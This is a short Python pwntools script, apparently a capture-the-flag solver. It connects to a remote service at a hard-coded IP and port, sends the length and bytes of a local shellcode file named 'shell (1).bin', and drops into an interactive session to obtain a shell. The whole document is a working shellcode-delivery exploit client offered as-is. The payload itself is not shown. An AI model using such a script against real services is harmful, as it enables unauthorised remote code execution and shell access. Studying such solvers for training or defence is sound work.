from pwn import *

p = remote('3.144.85.156', 3333)

f = open('/Users/yitao/Downloads/shell (1).bin', 'rb')
sc = f.read()
f.close()

p.send(str(len(sc)).encode())
p.send(sc)

p.interactive()